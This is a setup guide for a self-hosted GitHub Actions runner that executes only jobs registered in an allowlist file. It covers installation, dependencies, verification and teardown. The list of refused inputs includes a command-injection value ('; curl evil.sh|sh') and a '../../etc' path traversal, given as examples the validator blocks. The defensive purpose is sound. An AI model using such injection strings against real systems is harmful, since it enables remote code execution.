# Cluster runner setup

One-time setup, ~15 minutes. After this, jobs are dispatched from GitHub and you
stop receiving markdown files over DM.

## What this changes for you

Today: a markdown file arrives, you read it, run commands by hand, zip results,
send them back.

After: a job appears in the queue, runs, and its evidence bundle is uploaded
automatically. **You never execute a command someone else wrote.** The requester
picks a job *name* from `ops/jobs.yaml`; `scripts/ops/run_job.py` builds the
command line itself and refuses anything not in that file. You audit the registry
once — it is short — instead of reviewing every request.

Refusals it enforces, all tested:

```
REFUSED: 'rm_rf' is not a registered job.
REFUSED: raw_dir: unsafe path '../../etc'
REFUSED: raw_dir: unsafe path '/tmp/a; curl evil.sh|sh'
REFUSED: workers=9999 above max 64
```

Adding a job requires a commit to `ops/jobs.yaml`, which you can review.

## Security notes before you start

- **The repo is private.** This matters: a self-hosted runner on a *public* repo
  lets anyone open a PR that runs code on your machine. Do not attach this runner
  to a public repo.
- **No credentials leave your hardware.** Nothing in this setup asks for your
  cluster password or SSH key, and none is stored in the repo.
- **No inbound ports.** The runner polls outward. Nothing needs to reach in.

## Where to put the runner

**Option A — directly on the cluster node** (simplest, if permitted). The job
runs where the data is; no SSH hop.

**Option B — on the Pi, which reaches the cluster.** Use this if a GitHub runner
on the cluster is not allowed. Install as below on the Pi, then edit
`ops/jobs.yaml` so each `command` is prefixed with your SSH invocation — your key
stays on the Pi and is never seen by the workflow.

Either way the label must be `kahlus-cluster`.

## Install

Settings → Actions → Runners → New self-hosted runner, then:

```bash
mkdir -p ~/actions-runner && cd ~/actions-runner
# use the download URL and token from that page (token expires in ~1 hour)
tar xzf actions-runner-linux-x64-*.tar.gz

./config.sh --url https://github.com/ptlnextdoor/Kahlus-V1 \
            --token <TOKEN_FROM_THE_PAGE> \
            --labels kahlus-cluster \
            --name chapman \
            --work _work --unattended

sudo ./svc.sh install && sudo ./svc.sh start   # survives reboot
sudo ./svc.sh status
```

Dependencies the jobs need:

```bash
python3 -m pip install --user wfdb numpy scipy pyyaml
python3 -c "import wfdb, numpy, scipy, yaml; print('ok')"
aws s3 ls --no-sign-request s3://physionet-open/challenge-2018/1.0.0/training/ | head -3
```

If that last command fails, the compute node has no outbound internet — tell me
and we will route the fetch differently.

## Verify

From the Actions tab: **cluster job** → Run workflow → job `smoke`, tick
**dry_run**. It resolves the command and prints it without executing. If argv
looks right, run again without dry_run.

## What you get back

Every run uploads an `evidence/` artifact containing `result.json` (job, params,
argv, exit code, elapsed, commit SHA, hostname) and `run.log`. The requester
reads it from GitHub — nothing to zip or send.

## Turning it off

```bash
sudo ./svc.sh stop && sudo ./svc.sh uninstall
```

Then remove the runner in Settings → Actions → Runners. No other cleanup.

## If something looks wrong

The runner executes only what `ops/jobs.yaml` declares. If a job in that file
looks like it does something it shouldn't, stop the service and say so — that
file is the whole trust boundary, and it is meant to be short enough to read.
